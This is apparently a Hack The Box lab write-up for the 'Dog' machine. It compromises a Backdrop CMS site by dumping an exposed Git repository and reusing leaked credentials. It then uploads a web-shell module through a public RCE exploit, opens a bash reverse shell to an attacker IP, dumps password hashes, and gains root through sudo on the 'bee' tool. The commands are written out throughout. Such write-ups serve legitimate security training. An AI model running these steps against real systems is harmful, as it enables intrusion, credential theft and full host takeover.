# Dog

## Recon

::: details nmap_scan.log
```log
Open 10.129.189.5:22
Open 10.129.189.5:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
| http-git: 
|   10.129.189.5:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

From about page we get 2 pieces of information: 1. Domain name, 2. CMS is Backdrop

![Writeup.png](/assets/pentest/htb/dog/Writeup.png)

`robots.txt` discloses some potential paths
```bash
└─$ curl dog.htb/robots.txt -s | grep -v '#'

User-agent: *
Crawl-delay: 10
Disallow: /core/
Disallow: /profiles/
Disallow: /README.md
Disallow: /web.config
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
```

### Git Dump

Nmap showed that `.git` was accessible so dump it
```bash
└─$ git-dumper http://dog.htb dog_src
```

From blog we have a username: `dogBackDropSystem`

[https://github.com/FisMatHack/BackDropScan](https://github.com/FisMatHack/BackDropScan)

```bash
└─$ curl http://dog.htb/core/profiles/testing/testing.info
name = Testing
description = Minimal profile for running tests. Includes absolutely required modules only.
version = BACKDROP_VERSION
backdrop = 1.x
type = profile
hidden = TRUE

dependencies[] = layout

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```

Backdrop version is `1.27.1`

### Backdrop Authenticated RCE

[Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/52021)

![Writeup-1.png](/assets/pentest/htb/dog/Writeup-1.png)

::: tip :bulb: MySQL Creds
`root:BackDropJ2024DS2024`
:::

`dogBackDropSystem` user didn't work. If we search for domain name inside project source we get a valid user.
```bash
└─$ grep '@dog.htb' . -Rain
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:12:        "tiffany@dog.htb"
./.git/logs/refs/heads/master:1:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000   commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./.git/logs/HEAD:1:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000        commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
```

::: tip :bulb: Creds
`tiffany:BackDropJ2024DS2024`
:::

![Writeup-2.png](/assets/pentest/htb/dog/Writeup-2.png)

### Web Shell

```bash
└─$ curl https://www.exploit-db.com/download/52021 -sLo rce.py
└─$ py rce.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php
```

Above URL didn't work, but [http://10.129.189.5/?q=admin/modules/install](http://10.129.189.5/?q=admin/modules/install) worked

![Writeup-3.png](/assets/pentest/htb/dog/Writeup-3.png)

```bash
The specified file shell.zip could not be uploaded. Only files with the following extensions are allowed: tar tgz gz bz2.
```

```bash
└─$ tar -czvf shell.tgz shell/
shell/
shell/shell.info
shell/shell.php
```

![Writeup-4.png](/assets/pentest/htb/dog/Writeup-4.png)

[http://dog.htb/modules/shell/shell.php?cmd=id](http://dog.htb/modules/shell/shell.php?cmd=id)

![Writeup-5.png](/assets/pentest/htb/dog/Writeup-5.png)

### Reverse Shell

Get reverse shell (because HTB deletes the modules every x minutes and webshell is unusable...)
```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.131/4444 0>&1'
```

```bash
(remote) www-data@dog:/var/www/html$ mysql -u root -p'BackDropJ2024DS2024' backdrop -e 'SHOW DATABASES;'
(remote) www-data@dog:/var/www/html$ mysql -u root -p'BackDropJ2024DS2024' backdrop -e 'SHOW TABLES;'
(remote) www-data@dog:/var/www/html$ mysql -u root -p'BackDropJ2024DS2024' backdrop -e 'SELECT * FROM users;'
(remote) www-data@dog:/var/www/html$ mysql -u root -p'BackDropJ2024DS2024' backdrop -e 'SELECT name,pass FROM users;'
mysql: [Warning] Using a password on the command line interface can be insecure.
+-------------------+---------------------------------------------------------+
| name              | pass                                                    |
+-------------------+---------------------------------------------------------+
| jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. |
| jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 |
| dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD |
| john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. |
| morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS |
| axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV |
| rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT |
| tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v |
+-------------------+---------------------------------------------------------+
```

No luck with hashes
```bash
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\wordlist.txt
```

## SSH (22)

### Password Reuse

Try password reuse:
```bash
(remote) www-data@dog:/var/www/html$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash

└─$ sshpass -p 'BackDropJ2024DS2024' ssh jobert@dog.htb
└─$ sshpass -p 'BackDropJ2024DS2024' ssh johncusack@dog.htb
johncusack@dog:~$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
```

::: tip :bulb: Creds
`johncusack:BackDropJ2024DS2024`
:::

### User.txt

```bash
johncusack@dog:~$ cat user.txt
767f04adc441bc96280bfcaf26e33237
```

## Privilege Escalation

```bash
johncusack@dog:~$ sudo -l
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```bash
johncusack@dog:~$ bee version
 ✔  Bee for Backdrop CMS - Version 1.x-1.x
```

In help menu we have `eval`
```bash
 ADVANCED
...
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
...
```

```bash
johncusack@dog:~$ sudo bee eval 'system("id")'
 ✘  The required bootstrap level for 'eval' is not ready.
 
johncusack@dog:~$ sudo bee --root=/var/www/html eval 'system("id")'
uid=0(root) gid=0(root) groups=0(root)
```

```bash
johncusack@dog:~$ sudo bee --root=/var/www/html eval 'system("bash")'
root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@dog:/var/www/html# cat /root/root.txt
82e235d6179edd817b4fdb8c1f7aefe2
```